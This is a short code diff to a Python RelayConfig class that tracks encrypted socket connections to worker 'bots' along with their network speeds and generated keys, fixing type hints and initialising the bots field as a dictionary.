@@ -1,5 +1,5 @@
 from dataclasses import dataclass
-from typing import Any, ClassVar
+from typing import ClassVar
 from socket import socket as Sock
 from cryptography.fernet import Fernet
 from colorama import Fore
@@ -42,7 +42,7 @@ class RelayConfig:
 
     debug: bool
     fernet: Fernet
-    bots: dict[Sock, Any] # number of bots
+    bots: dict[Sock, tuple[str, int]] # number of bots
     speed: list[int] # actual netspeed of all bot
     gen_key: list[str]
     old_gen_key: list[str]
@@ -63,7 +63,7 @@ class RelayConfig:
     def __init__(self, debug: bool = False) -> None:
         self.debug = debug
         self.fernet = Fernet(self.ENC_KEY)
-        self.bots = []
+        self.bots = {}
         self.speed = []
         self.gen_key = []
         self.old_gen_key = []
